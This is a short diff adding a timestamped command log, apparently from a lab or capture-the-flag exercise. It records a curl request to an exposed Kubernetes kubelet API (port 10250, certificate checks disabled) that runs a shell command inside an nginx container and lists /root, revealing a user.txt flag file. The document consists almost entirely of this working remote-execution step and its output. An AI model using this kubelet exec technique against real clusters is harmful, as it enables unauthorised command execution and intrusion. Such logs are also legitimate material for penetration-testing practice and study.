@@ -1,0 +1,14 @@
+### [2026-04-05 10:24:37] curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=ls -la /root/
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=ls -la /root/
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100    163 100    146 100     17   1243    144                              0100    163 100    146 100     17   1243    144                              0100    163 100    146 100     17   1242    144                              0
+total 12
+drwxr-xr-x 2 root root 4096 Nov 30  2021 .
+drwxr-xr-x 1 root root 4096 Apr  4 12:37 ..
+-rw-r--r-- 2 root root   33 Apr  4 12:36 user.txt
+
+# Exit code: 0
+# Duration: 2026-04-05 10:24:37
